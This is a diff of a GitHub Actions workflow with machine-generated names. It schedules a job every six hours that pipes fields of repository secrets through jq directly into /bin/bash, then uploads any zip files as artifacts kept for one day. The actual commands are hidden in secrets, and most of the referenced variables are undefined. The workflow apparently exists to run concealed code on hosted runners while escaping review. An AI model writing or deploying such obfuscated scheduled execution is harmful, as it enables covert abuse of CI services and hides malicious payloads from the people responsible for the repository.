@@ -1,34 +1,28 @@
 name: refactorweb292
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '28 2/6 * * *'
 
+  schedule:
+    - cron: '33 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: refactorweb292
         env:
-          ngng3: ${{ secrets.ngng3 }}
+          qo959: ${{ secrets.qo959 }}
         run: |
-          echo $ngng3 | jq -r .wfuz319 | /bin/bash
-          echo $gbp35 | jq -r .k62 | /bin/bash
-          echo $pp83 | jq -r .g0839 | /bin/bash
-          echo $e53 | jq -r .rzl68 | /bin/bash
-          echo $ndejc4105 | jq -r .iae222 | /bin/bash
-          echo $y8 | jq -r .xcyes7 | /bin/bash
-          echo $lylug5389 | jq -r .nioas1073 | /bin/bash
-          echo $kzis8563 | jq -r .dlwoh762 | /bin/bash
-          echo $isa46258 | jq -r .wu7592 | /bin/bash
-          echo $mvyru8978 | jq -r .vcwc51195 | /bin/bash
-          echo $rtwji107 | jq -r .mq8344 | /bin/bash
-          echo $fo79918 | jq -r .urye1292 | /bin/bash
-          echo $ajhda8 | jq -r .pd52542 | /bin/bash
-          echo $zlncw02702 | jq -r .hr964 | /bin/bash
-          echo $df8708 | jq -r .jjked907 | /bin/bash
-          echo $ztjt70 | jq -r .ox2890 | /bin/bash
+          printf '%s' "$qo959" | jq -r .zlrlm61 | /bin/bash
+          printf '%s' "$ofrz47" | jq -r .mmo63002 | /bin/bash
+          echo $ouaq54798 | jq -r .o1 | /bin/bash
+          printf '%s' "$cmu571" | jq -r .quzsv90545 | /bin/bash
+          echo $wkv8175 | jq -r .adccr8 | /bin/bash
+          echo $e7854 | jq -r .ib284 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ODdrg5GE
+          path: "*.zip"
+          retention-days: 1
